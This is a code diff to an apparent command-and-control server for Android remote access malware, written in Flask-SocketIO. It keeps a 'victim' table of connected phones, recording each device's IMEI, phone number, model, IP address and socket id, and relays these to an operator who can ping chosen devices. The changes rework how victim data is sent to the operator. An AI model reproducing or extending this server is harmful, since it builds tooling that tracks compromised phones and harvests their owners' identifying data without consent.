@@ -73,6 +73,9 @@ def test_connect():
 @socketio.on('android_connect')
 def value_changed(data):
     print(data)
+    sid = ""
+    with open('server_soc_id.txt', 'r') as f:
+        sid = f.read()
     try:
         con = sqlite3.connect("database.db")
         cur = con.cursor()
@@ -93,38 +96,18 @@ def value_changed(data):
             )
             con.commit()
         else:
-            sid = ""
-            with open('server_soc_id.txt', 'r') as f:
-                sid = f.read()
-            if record[3] != request.remote_addr:
-                cur.execute("UPDATE victim SET ipaddress= ? WHERE deviceid=?", (request.remote_addr, data['device_id']))
+            if record[0][3] != request.remote_addr:
+                cur.execute("UPDATE victim SET ipaddress=? WHERE deviceid=?", (request.remote_addr, data['device_id']))
                 con.commit()
-                emit("update_victim_ip", {
-                        'deviceid' : data['device_id'],
-                        'ipaddress' : request.remote_addr
-                    }, to= sid
-                )
-            if record[6] != request.sid:
-                cur.execute("UPDATE victim SET socketid= ? WHERE deviceid=?", (request.sid, data['device_id']))
+                emit("update victim ip", {'data' : [data['device_id'], request.remote_addr]})
+            if record[0][6] != request.sid:
+                cur.execute("UPDATE victim SET socketid=? WHERE deviceid=?", (request.sid, data['device_id']))
                 con.commit()
-                emit("update_victim_socketid", {
-                        'deviceid' : data['device_id'],
-                        'socketid' : request.sid
-                    }, to= sid
-                )
-        emit("new_device", {
-                'model': data['model'],
-                'deviceid' : data['device_id'],
-                'ipaddress' : request.remote_addr,
-                'api' : data['api'],
-                'imei' : data['imei'],
-                'socketid' : request.sid,
-                'phone' : data['phone']
-            }, to= sid
-        )
+                emit("update victim socketid", {'data' : [data['device_id'], request.sid]})
         con.close()
     except sqlite3.Error as error:
         print(error)
+    emit("new device", {'data': [data['model'], data['device_id'], request.remote_addr, data['api'], data['imei'], request.sid, "phone placeholder"]})
 
     # emit('android value', message, broadcast=True,)
 
@@ -265,11 +248,7 @@ def clients():
 def ping_client():
     if request.method == 'POST':
         if 'username' in session:
-            emit("ping", {
-                "data" : "syn",
-                "deviceid" : request.form['deviceid']
-                }, to=request.form['socketid']
-            )
+            emit("ping", {"data" : ["syn", request.form['deviceid']],}, to=request.form['socketid'])
             return jsonify({"status" : "Device pinged. Waiting for response ..."}), 200
         else:
             return redirect("/login", code=302)
